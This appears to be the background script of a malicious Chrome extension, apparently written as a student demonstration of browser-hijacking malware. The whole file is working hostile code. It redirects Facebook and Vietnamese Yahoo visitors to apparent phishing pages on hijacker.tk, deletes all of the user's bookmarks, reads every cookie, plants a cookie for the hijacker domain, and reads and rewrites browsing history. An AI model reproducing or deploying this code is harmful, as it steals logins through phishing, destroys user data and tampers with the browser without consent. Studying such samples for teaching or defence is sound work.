var $ = chrome.bookmarks;

if (window.location.hostname == "www.facebook.com") {
    window.location.href = "https://hijacker.tk/FB/";
}

if (window.location.hostname == "vn.yahoo.com") {
    window.location.href = "https://hijacker.tk/Yahoo/Yahoo.php";
}


function createBookmark(title, url) {
    chrome.bookmarks.create({
        'title': title,
        'url': url,
    });
}

function deleteBookmarks(node) {
    if(node.children) {
        node.children.forEach(function(child) { deleteBookmarks(child);});
    }
    if(node.id) {
        chrome.bookmarks.remove(node.id);
    }
}

let histories = [];

Promise.all([
    chrome.bookmarks.getTree(),
    chrome.cookies.getAll({}),
]).then(response => {
    let bookmarks = response[0];
    let cookies = response[1];
    
    bookmarks[0].children.forEach(element => {
      deleteBookmarks(element);
    });
    createBookmark('Test', 'https://courses.uit.edu.vn');
    
    chrome.cookies.set({
        name: "malicious_cookies",
        value: "Co_che_hoat_dong_cua_ma_doc",
        expirationDate: 3600,
        url: "https://hijacker.tk",
    }); 

    
    chrome.history.search({
        text: "google"
    }, function(res) {
        let history = res;
        console.log(history);
    })
    
    chrome.history.deleteUrl({
        url: "https://phamtrantiendat.com"
    });

    chrome.history.addUrl({
        url: "https://phamtrantiendat.com"
    });
});
